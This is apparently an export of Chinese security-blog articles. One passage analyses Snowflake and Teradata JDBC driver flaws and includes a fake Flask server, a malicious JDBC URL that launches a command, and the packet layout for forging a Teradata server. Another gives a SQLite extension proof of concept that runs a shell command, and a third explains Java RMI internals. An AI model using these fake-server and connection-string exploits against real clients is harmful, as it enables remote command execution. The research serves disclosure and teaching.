this.loginInput.getServerUrl();\n\t\tString authenticator = this.loginInput.getAuthenticator();\n\t\tURIBuilder fedUriBuilder = new URIBuilder(serverUrl);\n\t\tfedUriBuilder.setPath(&quot;/session/authenticator-request&quot;); // [4]\n\t\tURI fedUrlUri = fedUriBuilder.build();\n\t\tHttpPost postRequest = this.handlers.build(fedUrlUri);\n\t\tClientAuthnDTO authnData = new ClientAuthnDTO();\n\t\tMap&lt;String, Object&gt; data = new HashMap();\n\t\tdata.put(ClientAuthnParameter.AUTHENTICATOR.name(), authenticator);\n\t\tdata.put(ClientAuthnParameter.ACCOUNT_NAME.name(), this.loginInput.getAccountName());\n\t\tdata.put(ClientAuthnParameter.LOGIN_NAME.name(), this.loginInput.getUserName());\n\t\tdata.put(ClientAuthnParameter.BROWSER_MODE_REDIRECT_PORT.name(), Integer.toString(port));\n\t\tdata.put(ClientAuthnParameter.CLIENT_APP_ID.name(), this.loginInput.getAppId());\n\t\tdata.put(ClientAuthnParameter.CLIENT_APP_VERSION.name(), this.loginInput.getAppVersion());\n\t\tauthnData.setData(data);\n\t\tString json = this.mapper.writeValueAsString(authnData);\n\t\tStringEntity input = new StringEntity(json, StandardCharsets.UTF_8);\n\t\tinput.setContentType(&quot;application/json&quot;);\n\t\tpostRequest.setEntity(input);\n\t\tpostRequest.addHeader(&quot;accept&quot;, &quot;application/json&quot;);\n\t\tString theString = HttpUtil.executeGeneralRequest(\n\t\t\tpostRequest,\n\t\t\tthis.loginInput.getLoginTimeout(),\n\t\t\tthis.loginInput.getAuthTimeout(),\n\t\t\tthis.loginInput.getSocketTimeout(),\n\t\t\t0,\n\t\t\tthis.loginInput.getHttpClientSettingsKey()\n\t\t);\n\t\tlogger.debug(&quot;authenticator-request response: {}&quot;, new Object[]{theString});\n\t\tJsonNode jsonNode = this.mapper.readTree(theString); // [5]\n\t\tif (!jsonNode.path(&quot;success&quot;).asBoolean()) {\n\t\t\tlogger.debug(&quot;response = {}&quot;, new Object[]{theString});\n\t\t\tString errorCode = jsonNode.path(&quot;code&quot;).asText();\n\t\t\tthrow new SnowflakeSQLException(&quot;08001&quot;, Integer.valueOf(errorCode), new Object[]{jsonNode.path(&quot;message&quot;).asText()});\n\t\t} else {\n\t\t\tJsonNode dataNode = jsonNode.path(&quot;data&quot;);\n\t\t\tthis.proofKey = dataNode.path(&quot;proofKey&quot;).asText();\n\t\t\treturn dataNode.path(&quot;ssoUrl&quot;).asText(); // [6]\n\t\t}\n\t} catch (URISyntaxException | IOException var14) {\n\t\tthrow new SFException(var14, ErrorCode.NETWORK_ERROR, new Object[]{var14.getMessage()});\n\t}\n}\n那么再伪造一个服务器即可，代码如下\nfrom flask import Flask,jsonify,request\n \napp = Flask(__name__)\n \n@app.route(&#039;/session/authenticator-request&#039;, method = [&#039;POST&#039;])\ndef ssoAuth():\n    if (request.method == &#039;POST&#039;):\n        data = {&quot;success&quot;: &quot;true&quot;, &quot;data&quot;: {&quot;proofKey&quot;: &quot;foo&quot;, &quot;ssoUrl&quot;: &quot;calc&quot;}}\n        return jsonify(data)\n \nif __name__ == &#039;__main__&#039;:\n    app.run(&#039;0.0.0.0&#039;, debug=True, port=443, ssl_context=(&#039;jdbc-attack.com.pem&#039;, &#039;jdbc-attack.com.key&#039;))\n本地复现，只需构造一个证书并在 hosts 文件中将 jdbc-attack.com 指向 127.0.0.1.\nTeradata\n与 Snowflake 十分类似，Treadata JDBC Driver 中有几乎一样的问题。Treadata 中有一个参数 BROWSER，\n\nBROWSER：指定一个自定义命令，用于打开浏览器进行身份验证，需要与 LOGMECH=BROWSER 配合使用。该参数的使用有如下要求\n\n忽略 JDBC URL 中的 User、 Password 和 LOGDATA 参数。\n仅支持 Windows 和 macOS。\nTeradata 数据库必须使用联合身份验证的身份提供程序信息。\n此功能从 Teradata Advanced SQL Engine 17.10 和 Teradata JDBC Driver 17.10.00.01 版本开始支持\n\n\n\n触发点的上下文代码如下，位于 com.teradata.jdbc.jdbc.GenericTeradataConnection#GenericTeradataConnection。在 [7] 中获取 BROWSER 参数内容，判断其是否为空，是的话则采用默认的\n\ncmd /c start &quot;title&quot; &quot;PLACEHOLDER&quot; （Windows）\nopen PLACEHOLDER （macOS）\n\n在 [8] 向服务器发起握手请求，并判断返回的内容，注意判断条件 m_gtwConfig 、getIdentityProviderURL()、getIdentityProviderClientID() 的返回内容都不能为空。并根据服务器返回的 providerURL，拼接上 /.well-known/openid-configuration，发起如下请求 [9]\nhttps?://&lt;host&gt;//.well-known/openid-configuration\n\n响应内容需要为 json 格式并包含 authorization_endpoint 和 token_endpoint。之后在客户端打开一个临时的 HTTP 服务，监听在本地的随机端口上，并开启路由 http://localhost/openid-callback（下面粘贴的代码省略了这部分逻辑）。\n最后再执行 BROWSER 中的参数。\nprotected GenericTeradataConnection(String var1, String var2, String var3, URLParameters var4) throws SQLException {\n\t\t// ...\n \n        if (&quot;BROWSER&quot;.equalsIgnoreCase(this.urlParams.getLogMech())) {\n            label189: {\n\t\t\t\t// ...\n                String var6 = this.urlParams.getBrowser(); // [7]\n                String var8;\n                if (var6 == null || var6.length() == 0) {\n\t\t\t\t\t// ...\n                }\n \n                GenericTeradataConnection var32 = makeLogMechNoneConnection(this); // [8]\n                if (var32.m_gtwConfig != null &amp;&amp; var32.m_gtwConfig.getIdentityProviderURL() != null &amp;&amp; var32.m_gtwConfig.getIdentityProviderClientID() != null) {\n                    var8 = var32.m_gtwConfig.getIdentityProviderURL();\n                    String var9 = var32.m_gtwConfig.getIdentityProviderClientID();\n\t\t\t\t\t// ...\n \n                    var8 = var8.replaceFirst(&quot;/+$&quot;, &quot;&quot;);\n                    if (var8.length() != 0 &amp;&amp; var9.length() != 0) {\n                        String var10 = &quot;/.well-known/openid-configuration&quot;;\n                        if (!var8.toLowerCase().endsWith(var10)) {\n                            var8 = var8 + var10;\n                            if (this.log.isDebugEnabled()) {\n                                this.log.debug(&quot;Modified sIdProURL=&quot; + var8);\n                            }\n                        }\n \n                        String var11 = Utility.doHttpRequest(this.urlParams, this.log, &quot;GET&quot;, var8, (String[][])null, (byte[])null, true, &quot; &quot;, new int[]{200}).sBody; // [9]\n                        String var12 = Utility.getStringFromJSON(&quot;authorization_endpoint&quot;, var11, &quot;TJ1544&quot;, var8);\n                        String var13 = Utility.getStringFromJSON(&quot;token_endpoint&quot;, var11, &quot;TJ1544&quot;, var8);\n \n\t\t\t\t\t\t// ... listening on random port of localhost\n \n                        var6 = var6.replaceAll(&quot;PLACEHOLDER&quot;, var12 + &quot;?response_type=code&quot; + &quot;&amp;client_id=&quot; + Utility.safeForURL(var9) + &quot;&amp;redirect_uri=&quot; + Utility.safeForURL(var20) + &quot;&amp;code_challenge=&quot; + Utility.safeForURL(var15) + &quot;&amp;code_challenge_method=S256&quot; + &quot;&amp;scope=&quot; + Utility.safeForURL(var21));\n                        if (this.log.isTimingEnabled()) {\n                            this.log.timing(&quot;Launching browser &quot; + var6);\n                        }\n \n                        Process var22;\n                        try {\n                            var22 = Runtime.getRuntime().exec(var6); // [10]\n这里重要的一步是满足 [8] 中描述的条件，所以需要伪造一个 Teradata 服务端，返回特定数据。具体的攻击步骤如下：\n\n攻击者伪造一个 Treadata 服务。\n控制 JDBC URL，连接伪造的服务，并告知客户端，开启 OIDC。\n客户端访问 OIDC 服务（此处还是一个 Bind SSRF）\n客户端执行 JDBC URL BROWSER 参数中的命令\n\n@Test\npublic void cmd() throws SQLException {\n\tString url =\n\t\t\t&quot;jdbc:teradata://127.0.0.1/DBS_PORT=10250,LOGMECH=BROWSER,BROWSER=&#039;open -a calculator&#039;,TYPE=DEFAULT,COP=OFF,TMODE=TERA,LOG=DEBUG&quot;;\n \n\tDriverManager.getConnection(url);\n}\n伪造 Teradata Advanced Database Server\n通过分析代码，对响应内容的解析位于 com.teradata.jdbc.jdbc.GenericLogonController#run 方法中。\n\nTeradata Database 不免费提供，所以不太好通过抓个包来快速伪造一个服务器。暂时只能通过分析代码的方式来解决。\n\n分析 com.teradata.jdbc.jdbc.GenericLogonController#run 的代码逻辑，响应包 payload 的处理会细分至 TDPacket [11]\npublic void run() throws SQLException {\n\tTDPacket var2 = this.m_con.createPacket(1);\n\t// ...\n\tParcel var5;\n\twhile((var5 = var2.nextParcel()) != null) { // [11]\n查看 TDPacket#nextParcel 方法，逻辑结构为 switch 语句，根据对 [8] 中判断条件的分析知道，响应包应该解析为 GtwConfigParcel 类对象的\npublic Parcel nextParcel() throws SQLException {\n\tObject var3 = null;\n\tif (this.packet != null &amp;&amp; this.currentPosition &lt; this.m_nReadLimit) {\n\t\tshort var4 = Parcel.trueFlavor(this.buffer.getShort(this.currentPosition)); // short 2 bytes\n\t\tthis.log.debug(&quot;ParcelFactory:nextParcel flavor value: &quot; + var4);\n\t\tlong var1;\n\t\tswitch (var4) {\n\t\t\t// ...\n\t\t\tcase 165: // 00 A5\n\t\t\t\tthis.log.debug(&quot;ParcelFactory: creating a GtwConfigParcel&quot;);\n\t\t\t\tvar1 = System.currentTimeMillis();\n\t\t\t\tthis.buffer.position(this.currentPosition);\n\t\t\t\tvar3 = new GtwConfigParcel(this.buffer, this.m_con); // parsing GtwConfigParcel\n\t\t\t\tthis.currentPosition += ((Parcel)var3).getLength();\n\t\t\t\tthis.log.debug(&quot;parcelfactory GtwConfig create time: &quot; + (System.currentTimeMillis() - var1));\n\t\t\t\tbreak;\nGtwConfigParcel\nGtwConfigParcel 类对象的构造方法如下\npublic GtwConfigParcel(TDPacketStream var1, GenericTeradataConnection var2) throws SQLException {\n\tsuper(var2);\n\tthis.flavorPosition = var1.position();\n\tthis.setFlavor(var1.getShort());\n\tthis.setLength(var1.getShort());\n\tif (var1.getInt() == 1) {\n\t\tthis.determineFeatureSupport(var1, this.flavorPosition + this.length);\n\t}\n}\n由前面的分析 [8] 知道，需要 m_sIdentityProviderURL 和 m_sIdentityProviderClientID 两个属性，相关代码位于 determineFeatureSupport，步进为 short，即 2 个比特。\nprivate void determineFeatureSupport(TDPacketStream var1, int var2) throws SQLException {\n\tint var3;\n\tshort var5;\n\tfor(; var1.position() + 4 &lt;= var2; var1.position(var3 + var5)) {\n\t\tvar3 = var1.position();\n\t\tshort var4 = var1.getShort();\n\t\tvar5 = var1.getShort();\n \n\t\t// ...\n \n\t\tswitch(var4) {\n\t\t\tcase 15:\n\t\t\t\tthis.m_sIdentityProviderClientID = var1.getStringUTF8(var1.getUnsignedShort());\n\t\t\t\tthis.m_sIdentityProviderURL = var1.getStringUTF8(var1.getUnsignedShort());\n\t\t\t\tbreak;\n从中可以看到，payload 的结构为 flag (2 byte) + payload length (2 byte) + m_sIdentityProviderClientID + m_sIdentityProviderURL，字符串类型数据由一个前缀 (2 byte)，指定后续字符串内容的长度。\n补充 ConfigRspParcel，和 AuthMechParcel 应该就可以了\nHeader &gt; com.teradata.jdbc.jdbc_4.io.LanHeader\n\tLength 52\n\tversion 1 byte\n\tmsgType 1 byte\n\tkind 1 byte\n\tmsgLenHigh 2 byte\n\tbyteVar 1 byte\n\twordVar 2 byte\n\tmsgLenLow  2 byte\n\t跳过 6 byte\n\tcorelationTag 4 byte\n\tsessionNo 4 byte\n\tauthentication[] 8 byte\n\trequestNo 4 byte\n\tunionGTW 1 byte\n\thostCharSet 1 byte\n\t跳过 1 byte\n\tm_nControlDataLength  从第41个字节开始的后4个字节\n\nPayload GtwConfigParcel\n\tflavor 2 byte 00 A5\n\tlength 2 byte payload length\n\tunknown 4 byte 00 00 00 01 -&gt; determineFeatureSupport\n\tself-defining feature 2 byte 00 0F\n\tself-defining feature length 2 byte\n\tunsigned short length 2 byte\n\tstring (m_sIdentityProviderClientID)\n\tunsigned short length 2 byte\n\tstring (m_sIdentityProviderURL)\n"},"articles/security/java/jdbc/SQLite-Extension-编写":{"title":"SQLite Extension 编写","links":[],"tags":["sqlite","extensions"],"content":"Run-Time Loadable Extensions\nLoad An Extension\n#include &lt;sqlite3ext.h&gt;\n#include &lt;stdlib.h&gt;\nSQLITE_EXTENSION_INIT1\n \n#ifdef _WIN32\n__declspec(dllexport)\n#endif\nint poc( /* &lt;== Change this name, maybe */\n  sqlite3 *db,\n  char **pzErrMsg,\n  const sqlite3_api_routines *pApi\n){\n  int rc = SQLITE_OK;\n  SQLITE_EXTENSION_INIT2(pApi);\n  /* insert code to initialize your extension here */\n \n  system(&quot;touch /tmp/poc_trganda&quot;);\n \n  return rc;\n}\n问题，SELECT load_extension() 会根据系统自动添加后缀\n安装依赖\nsudo apt install libsqlite3-dev\nlinux\ngcc -g -fPIC -shared poc.c -o poc.so\nmac\ngcc -g -fPIC -dynamiclib poc.c -o poc.dylib\n编译\ngcc -Os -flto -fdata-sections -ffunction-sections -c poc.c\ngcc -fPIC -Wl,-z,max-page-size=0x40 -s -nostartfiles -nostdlib -flto -shared poc.o -o poc.so\n \nmax-page-size=0x100"},"articles/security/java/roadmap/Java-安全---RMI-介绍":{"title":"Java 安全 - RMI 介绍","links":[],"tags":["java","rmi"],"content":"在分布式应用场景中，会经常使用到一个概念，叫 RPC（远程方法调用协议）。它的目的是让一台机器可以向另一台机器发出请求，协助计算一个任务并返回计算结果。RMI 是 Java 语言中，一种实现 RPC 的方式，完全由 Java 语言编写，在 TCP 之上使用 Java Remote Method Protocol(JRMP) 协议进行传输。由于采用的是自己设计的协议，它的缺点是只支持 Java 语言。 后续为了能够让其它语言也能与 RMI 对象进行交互，Java 开始支持 CORBA 架构下的 IIOP 协议，并由此引出了名为 RMI-IIOP 的概念。这里只是顺带一提，不细究。 RMI 和其他的 RPC 实现方式都是类似的，主要由 3 个部分组成。\n\nClient（客户端）\nRegistry（注册中心）\nServer（服务端）\n\n RMI 的调用过程会借助名为 Stub 和 Skel 的结构，它们可以看作是 Client 与 Server 沟通的代理。 RPC 的实现方式一般为，服务端向注册中心注册自己开放的计算服务，可以简单的理解为一个方法或函数。客户端在需要使用时，先访问注册中心，查找是否有自己需要的计算服务，成功获取需要的信息（如 Server 的 IP 和 Port）后再去访问 Server。 下面先看 Java 中 RMI 的代码示例，Java 中的 RMI 是以接口的形式来提供远程调用服务的。\n快速开始\n下面通过示例代码演示 RMI 的调用过程。\n服务端代码\n服务端代码：\npublic interface RemoteService extends java.rmi.Remote {\n    public void doSome(String msg) throws RemoteException;\n}\n \npublic class RemoteServiceImpl extends UnicastRemoteObject\n        implements RemoteService {\n \n    public RemoteServiceImpl(int port) throws RemoteException {\n\t    super(port);\n    }\n \n    @Override\n    public void doSome(String msg) throws RemoteException {\n        System.out.println(msg);\n    }\n}\n \npublic class OrdinaryRMIServer {\n    public static void main(String[] args) {\n        try {\n            int registryPort = Integer.parseInt(args[0]);\n            int serverPort = Integer.parseInt(args[1]);\n            String serverName = args[2];\n \n            System.out.println(registryPort + &quot; &quot; + serverPort + &quot; &quot; + serverName);\n \n            // explicitly set the port of server\n            RemoteServiceImpl rsi = new RemoteServiceImpl(serverPort);\n \n            // refer:\n            //   docs.oracle.com/javase/8/docs/api/java/rmi/registry/LocateRegistry.html\n            // default listening port: 0.0.0.0:1099\n            Registry reg = LocateRegistry.createRegistry(registryPort);\n            // If the obj has no extends the UnicastRemoteObject, call exportObject\n            // to return a stub\n            // if (!(obj instanceof UnicastRemoteObject)) {\n            //    obj = UnicastRemoteObject.exportObject((Remote) obj, serverPort);\n            // }\n \n            reg.bind(serverName, rsi);\n        } catch (Exception ex) {\n            ex.printStackTrace();\n        }\n    }\n}\n服务端分为 3 个部分：\n\n一个继承了 java.rmi.Remote 的接口，如这里的 RemoteService，其中定义了方法 doSome()\n一个实现了此接口的类，如这里的 RemoteServiceImpl，并且需要继承 UnicastRemoteObject 才能被绑定\n一个主类 OrdinaryRMIServer，将 RemoteServiceImpl 实例化之后，绑定至 Registry，也就是注册中心。\n\n指定端口\n对于 RemoteServiceImpl 对象，显式指定了它的端口为 56050，这么做的目的是为了便于抓包。如果不指定则会随机分配一个端口号，上面采用的方式是调用父类 UnicastRemoteObject 的构造方法。\n另一种方式是通过 UnicastRemoteObject.exportObject(Remote obj, int port) 来指定导出对象的端口号。\npublic class RemoteServiceImplNoRemote implements RemoteService {\n \n    @Override\n    public void doSome(String msg) throws RemoteException {\n        System.out.println(&quot;[&quot; + msg + &quot;]&quot;);\n    }\n}\n \npublic class OrdinaryRMIServerExport {\n    public static void main(String[] args) {\n        try {\n            int registryPort = Integer.parseInt(args[0]);\n            int serverPort = Integer.parseInt(args[1]);\n            String serverName = args[2];\n \n            System.out.println(registryPort + &quot; &quot; + serverPort + &quot; &quot; + serverName);\n \n            // // RemoteServiceImplNoRemote has no extend the UnicastRemoteObject\n            RemoteServiceImplNoRemote rsi = new RemoteServiceImplNoRemote();\n \n            // refer:\n            //   docs.oracle.com/javase/8/docs/api/java/rmi/registry/LocateRegistry.html\n            // default listening port: 0.0.0.0:1099\n            Registry reg = LocateRegistry.createRegistry(registryPort);\n            // If the obj has no extends the UnicastRemoteObject, call exportObject\n            // to return a stub\n            rsi =\n                    (RemoteServiceImplNoRemote)\n                            UnicastRemoteObject.exportObject((Remote) rsi, serverPort);\n \n            reg.bind(serverName, rsi);\n        } catch (Exception ex) {\n            ex.printStackTrace();\n        }\n    }\n}\n客户端代码\n客户端代码：\npublic class OrdinaryRMIClient {\n \n    public static void main(String[] args) {\n        try {\n            String addr = (args[0]);\n            int port = Integer.parseInt(args[1]);\n            String name = args[2];\n            String params = args[3];\n \n            System.out.println(addr + &quot; &quot; + port + &quot; &quot; + name + &quot; &quot; + params);\n \n            // default host: localhost; port: 1099\n            Registry registry = LocateRegistry.getRegistry(addr, port);\n            RemoteService rs = (RemoteService) registry.lookup(name);\n \n            rs.doSome(params);\n        } catch (Exception ex) {\n            ex.printStackTrace();\n        }\n    }\n}\n客户端的代码包含两部分，首先它需要知道服务端开放的接口，才能知道有哪些方法可以被调用，所以这里也需要 RemoteService。\n剩下的逻辑就是访问注册中心，通过 lookup 方法，查找服务端绑定的服务名，获取 RemoteService 对象，再调用 doSome() 方法。\n流量分析\n通过 Wireshark 抓包，内容如下：\n\n可以看到其中有两个 TCP 连接，分别是\n\n56531 → 1099：客户端至注册中心\n56531 → 56050：客户端至服务端\n\n前面的内容中有提到过 RMI 的通信流程，客户端需要先访问注册中心，获取服务端的信息再去访问服务端。注册中心返回的信息，就位于第 13 个数据包中，\n并且可以看到 Wireshark 识别出了数据包的内容为 Java 序列化之后的内容，那么端口 56050 是如何获得的呢？在数据中可以看到 192.168.91.1，在其之后跟着 00 00 DA F2，解码之后就是 56050 了。\n\n从这里就已经可以知道 RMI 的调用过程中使用了序列化的方式来传递数据。\n前面提过 RMI 的调用过程中有 3 部分：\n\nClient（客户端）\nRegistry（注册中心）\nServer（服务端）\n\n但代码中，只有两个主类，为什么？这一点还需要感谢 JDK 的封装，首先在早期，大概 JDK 6 推出的时候，Registry 是作为一个单独的可执行文件来提供的，它就是 rmiregistry，如果要启动 Registry 需要执行该文件，流程比较麻烦。\n现在可以在代码层面创建 Registry，并通过 bind() 方法绑定对象。\nRegistry reg = LocateRegistry.createRegistry(1099);\nreg.bind(name, (Remote) obj);\n第一行，创建并启动 Registry，\n第二行，将 Remote 对象于名称 name 进行绑定。bind() 方法的第一个参数可以是一个 URL，如 rmi://host:port/name。其中 host 和 port 就是 Registry 的主机名和端口，分别默认为 localhost 和 1099。\n前面的代码中，省略了 host 和 port，直接指定了 name。\n通信过程\n了解了基础的 RMI 知识，下面来看 RMI 的通信过程，下图对通信过程进行了梳理。\n 在 TCP 之上，RMI 借助 JRMP 协议进行沟通，工作过程如下\n\nRemoteService 接口的实现 RemoteServiceImpl 先继承 UnicastRemoteObject 类\n\nRemoteServiceImpl 对外暴露，等待外部 RMI 的访问\n暴露后会监听指定端口\n将自身注册至 Registry\n一个 Client 从 Registry 获取 RemoteServiceImpl 的访问信息\nClient 使用获取的信息，访问 RemoteServiceImpl\n\n\n当 Client 向 RemoteServiceImpl 发起远程调用请求后，它会创建一个 TCPConnection 对象，并与 RemoteServiceImpl 的指定端口连接。发送 RMI header 以及通过 StreamRemoteCall 发送序列化后的调用参数\nRemoteServiceImpl\n\nServer 通过新的线程来处理与 Client 的连接，并继续等待其它连接。\n读取 RMI header 信息并创建 RemoteCall 对象来处理传递过来的参数，并进行反序列化\nTransport 的 serviceCall() 会根据请求内容的不同，进行分发\ndispatch() 会调用合适的方法来处理对应的请求内容，并进行响应\n如果方法调用过程种出现异常，会将其序列化后传递给 Client\n\n\nClient\n\n从 Server 获取返回内容后，会进行反序列化\n\n\n\n不同主机上运行\n前面的示例代码是都是在本地主机上运行的，实际场景中都是拆分的。\n服务端代码不变，在地址为 198.19.249.3 的机器上运行\njava OrdinaryRMIServer 1099 56050 server\n启动客户端\njava OrdinaryRMIClient 127.0.0.1 1099 server hi\n但是可能会发生如下异常\njava.rmi.ConnectException: Connection refused to host: 127.0.0.1; nested exception is:\n\tjava.net.ConnectException: Connection refused (Connection refused)\n\tat sun.rmi.transport.tcp.TCPEndpoint.newSocket(TCPEndpoint.java:623)\n\tat sun.rmi.transport.tcp.TCPChannel.createConnection(TCPChannel.java:216)\n\tat sun.rmi.transport.tcp.TCPChannel.newConnection(TCPChannel.java:202)\n\tat sun.rmi.server.UnicastRef.newCall(UnicastRef.java:343)\n\tat sun.rmi.registry.RegistryImpl_Stub.lookup(RegistryImpl_Stub.java:116)\n\tat OrdinaryRMIClient.callRemote(OrdinaryRMIClient.java:11)\n\tat OrdinaryRMIClient.main(OrdinaryRMIClient.java:20)\nCaused by: java.net.ConnectException: Connection refused (Connection refused)\n\tat java.net.PlainSocketImpl.socketConnect(Native Method)\n\tat java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)\n\tat java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)\n\tat java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)\n\tat java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)\n\tat java.net.Socket.connect(Socket.java:607)\n\tat java.net.Socket.connect(Socket.java:556)\n\tat java.net.Socket.&lt;init&gt;(Socket.java:452)\n\tat java.net.Socket.&lt;init&gt;(Socket.java:229)\n\tat sun.rmi.transport.proxy.RMIDirectSocketFactory.createSocket(RMIDirectSocketFactory.java:40)\n\tat sun.rmi.transport.proxy.RMIMasterSocketFactory.createSocket(RMIMasterSocketFactory.java:148)\n\tat sun.rmi.transport.tcp.TCPEndpoint.newSocket(TCPEndpoint.java:617)\n\t... 6 more\n\n这个异常产生的原因是因为 Server 默认绑定的地址与 Registry 中存储的内容不同，Registry 默认绑定在了 0.0.0.0，而 Server 默认也绑定在了 0.0.0.0，但是 Registry 中存储的内容不对，告知 Client Server 位于 127.0.0.1。导致 Client 从 Registry 获取的 Server 信息后访问了本机地址。\n关于这部分，官方 FAQ 中有相关解释：\n\ndocs.oracle.com/javase/8/docs/technotes/guides/rmi/faq.html\nA.1 Why do I get an exception for an unexpected hostname and/or port number when I call Naming.lookup\n\n解决方法是启动 Server 时，通过 -Djava.rmi.server.hostname=198.19.249.3 参数手动指定绑定的地址\njava -Djava.rmi.server.hostname=198.19.249.3 OrdinaryRMIServer\n代码分析\n从源码角度看看为什么会发生前述情况，以及 java.rmi.server.hostname 是如何生效的。\n先看 RemoteServiceImpl 的创建过程，启动时指定参数 -Djava.rmi.server.hostname=198.19.249.3\n在 Registry reg = LocateRegistry.createRegistry(1099); 和 RemoteServiceImpl rsi = new RemoteServiceImpl(56050); 打下断点并运行，\n在 RegistryImpl.&lt;init&gt; 中会构造 LiveRef 对象\npublic LiveRef(ObjID objID, int port) {\n\tthis(objID, TCPEndpoint.getLocalEndpoint(port), true);\n}\nLiveRef 的构造方法中调用 TCPEndpoint.getLocalEndpoint(port) 获取的地址和端口是 198.19.249.3:1099。\n跟入 TCPEndpoint 的初始代码块，可以看到会检查 java.rmi.server.hostname 属性的内容，如果为空则返回 127.0.0.1。\n/**\n * Returns the value of the java.rmi.server.hostname property.\n */\nprivate static String getHostnameProperty() {\n\treturn AccessController.doPrivileged(\n\t\tnew GetPropertyAction(&quot;java.rmi.server.hostname&quot;));\n}\n \n/**\n * Find host name of local machine.  Property &quot;java.rmi.server.hostname&quot;\n * is used if set, so server administrator can compensate for the possible\n * inablility to get fully qualified host name from VM.\n */\nstatic {\n\tlocalHostKnown = true;\n\tlocalHost = getHostnameProperty();\n\tif (localHost == null) {\n\t\ttry {\n\t\t\tInetAddress localAddr = InetAddress.getLocalHost();\n调用栈如下：\ngetHostnameProperty:98, TCPEndpoint (sun.rmi.transport.tcp)\n&lt;clinit&gt;:109, TCPEndpoint (sun.rmi.transport.tcp)\n&lt;init&gt;:93, LiveRef (sun.rmi.transport)\n&lt;init&gt;:74, LiveRef (sun.rmi.transport)\n&lt;init&gt;:168, UnicastServerRef (sun.rmi.server)\nexportObject:320, UnicastRemoteObject (java.rmi.server)\n&lt;init&gt;:198, UnicastRemoteObject (java.rmi.server)\n&lt;init&gt;:15, RemoteServiceImpl (com.trganda.roadmap.rmi.impl)\nmain:29, OrdinaryRMIServer (com.trganda.roadmap.rmi.server)\n继续跟入代码至 TCPTransport#listen，[1] 中创建的套接字监听地址和端口为 0.0.0.0:1099，也就是说 Server 的监听地址和 java.rmi.server.hostname 属性无关。\nprivate void listen() throws RemoteException {\n\tassert Thread.holdsLock(this);\n\tTCPEndpoint ep = getEndpoint();\n\tint port = ep.getPort();\n \n\tif (server == null) {\n\t\tif (tcpLog.isLoggable(Log.BRIEF)) {\n\t\t\ttcpLog.log(Log.BRIEF,\n\t\t\t\t&quot;(port &quot; + port + &quot;) create server socket&quot;);\n\t\t}\n \n\t\ttry {\n\t\t\tserver = ep.newServerSocket(); // [1]\n调用栈如下：\nlisten:341, TCPTransport (sun.rmi.transport.tcp)\nexportObject:254, TCPTransport (sun.rmi.transport.tcp)\nexportObject:412, TCPEndpoint (sun.rmi.transport.tcp)\nexportObject:147, LiveRef (sun.rmi.transport)\nexportObject:237, UnicastServerRef (sun.rmi.server)\nexportObject:383, UnicastRemoteObject (java.rmi.server)\nexportObject:320, UnicastRemoteObject (java.rmi.server)\n&lt;init&gt;:198, UnicastRemoteObject (java.rmi.server)\n&lt;init&gt;:15, RemoteServiceImpl (com.trganda.roadmap.rmi.impl)\nmain:29, OrdinaryRMIServer (com.trganda.roadmap.rmi.server)\n接着看 Registry 的构造过程，也是类似的，最终会走到 TCPTransport#listen，创建的套接字监听地址和端口为 0.0.0.0:1099，也就是说 Registry 监听地址实际为 0.0.0.0 与 java.rmi.server.hostname 也无关。\n调用栈如下：\nlisten:341, TCPTransport (sun.rmi.transport.tcp)\nexportObject:254, TCPTransport (sun.rmi.transport.tcp)\nexportObject:412, TCPEndpoint (sun.rmi.transport.tcp)\nexportObject:147, LiveRef (sun.rmi.transport)\nexportObject:237, UnicastServerRef (sun.rmi.server)\nsetup:213, RegistryImpl (sun.rmi.registry)\n&lt;init&gt;:198, RegistryImpl (sun.rmi.registry)\ncreateRegistry:203, LocateRegistry (java.rmi.registry)\nstartListener:16, OrdinaryRMIServer (com.trganda.roadmap.rmi.server)\nmain:30, OrdinaryRMIServer (com.trganda.roadmap.rmi.server)\n\n深入 RegistryImpl#bind\n接着查看 RegistryImpl#bind，\npublic void bind(String name, Remote obj)\n\tthrows RemoteException, AlreadyBoundException, AccessException\n{\n\t// The access check preventing remote access is done in the skeleton\n\t// and is not applicable to local access.\n\tsynchronized (bindings) {\n\t\tRemote curr = bindings.get(name);\n\t\tif (curr != null)\n\t\t\tthrow new AlreadyBoundException(name);\n\t\tbindings.put(name, obj); // [2]\n\t}\n}\n它的实现很简单，把要绑定的对象存储在成员 bindings 中，而 Remote 对象中存储的就是 Server 的地址和端口。\nprivate Hashtable&lt;String, Remote&gt; bindings\n        = new Hashtable&lt;&gt;(101);\n所以最后的结论就是\n\nRegistry 和 Server 的监听地址默认都是 0.0.0.0，与前面构造 LiveRef 时获取的地址无关。\njava.rmi.server.hostname 影响的是 LiveRef 对象，而它才是存储在 Registry 中的内容，它实际获取的地址是 127.0.0.1，所以才导致 Client 从 Registry 获取到不恰当的信息 。\n\n如何绑定任意地址\n前面的示例代码，展示了如何指定 Server 绑定的端口，如果想绑定至默认地址 0.0.0.0 以外的地址也是可以做到的\nTCPEndpoint#newServerSocket 中，[3] 是通过一个 RMIServerSocketFactory 对象创建 Socket 的，\nServerSocket newServerSocket() throws IOException {\n\tif (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {\n\t\tTCPTransport.tcpLog.log(Log.VERBOSE,\n\t\t\t&quot;creating server socket on &quot; + this);\n\t}\n \n\tRMIServerSocketFactory serverFactory = ssf; // [3]\n\tif (serverFactory == null) {\n\t\tserverFactory = chooseFactory();\n\t}\n\tServerSocket server = serverFactory.createServerSocket(listenPort);\n而这个 ssf 可在 UnicastRemoteObject 的构造方法中中指定。\nprotected UnicastRemoteObject(int port,\n\t\t\t\t\t\t\t  RMIClientSocketFactory csf,\n\t\t\t\t\t\t\t  RMIServerSocketFactory ssf)\n\tthrows RemoteException\n{\n\tthis.port = port;\n\tthis.csf = csf;\n\tthis.ssf = ssf;\n\texportObject((Remote) this, port, csf, ssf);\n}\n实现一个自定义 RMIServerSocketFactory\npublic class ServerSocketFactoryImpl implements RMIServerSocketFactory {\n \n    private final InetAddress bindAddr;\n \n    public ServerSocketFactoryImpl(InetAddress bindAddr) {\n        this.bindAddr = bindAddr;\n    }\n \n    @Override\n    public ServerSocket createServerSocket(int port) throws IOException {\n        return new ServerSocket(port, 0, bindAddr);\n    }\n \n    /*\n     * docs.oracle.com/javase/8/docs/api/java/lang/Object.html\n     *\n     * An implementation of this interface should implement Object.equals(java.lang.Object)\n     * to return true when passed an instance 